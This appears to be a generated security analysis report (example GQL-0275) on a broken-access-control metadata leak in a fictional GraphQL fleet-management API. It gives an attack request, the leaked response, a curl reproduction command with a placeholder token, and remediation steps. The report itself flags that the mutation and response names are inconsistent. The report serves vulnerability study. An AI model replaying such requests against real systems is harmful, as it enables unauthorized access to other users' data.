# Security Analysis Report
**System:** OreTrack Fleet Management
**Domain:** Mining / Fleet Management
**Example ID:** GQL-0275
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BAC — Pattern 2.2 | Metadata/attribute side-channel on `updateResource` — attacker leaks fleet metadata via mutation response |

---

## Finding 1 — BAC: Metadata / Attribute Side-Channel via Mutation Response (Pattern 2.2)

### Summary
The GraphQL API at `https://api.oretrack-fleet-manag.example.com/graphql` exposes a `updateResource` mutation whose response leaks sensitive metadata fields that the caller is not authorized to read. The attacker sends an update with `ownerId: "attacker-24880231"` and the server's response (under `getResource` key) returns `sensitiveField` and `internalNotes` belonging to `other-user-24880231`, constituting a metadata side-channel.

**Context.txt inconsistency (documented):** The HAR request uses `updateResource(id: "R-2275", input: {status: "approved", ownerId: "attacker-24880231"})` (mutation), while the HAR response returns data under the key `getResource` (read). These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-24880231` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 2.2 — Metadata / attribute side-channel (BAC)
**Affected endpoint:** `POST https://api.oretrack-fleet-manag.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (mutation)**
```
POST https://api.oretrack-fleet-manag.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { updateResource(id: \"R-2275\", input: {status: \"approved\", ownerId: \"attacker-24880231\"}) { resourceId status } }"}
```

**Response — Victim Fleet Record Metadata Leaked**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-0231",
      "ownerId": "other-user-24880231",
      "data": {
        "sensitiveField": "CONFIDENTIAL-24880231",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.oretrack-fleet-manag.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { updateResource(id: \"R-2275\", input: {status: \"approved\", ownerId: \"attacker-24880231\"}) { resourceId status } }"}'
# Vulnerable: tenantId: tenant-0231, sensitiveField: CONFIDENTIAL-24880231
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Mutation response type must only include fields the caller is authorized to read.
2. Remove `ownerId` and `tenantId` from writable mutation inputs.
3. Resolver must verify `object.tenantId` matches JWT `tenantId` claim before returning any fields.
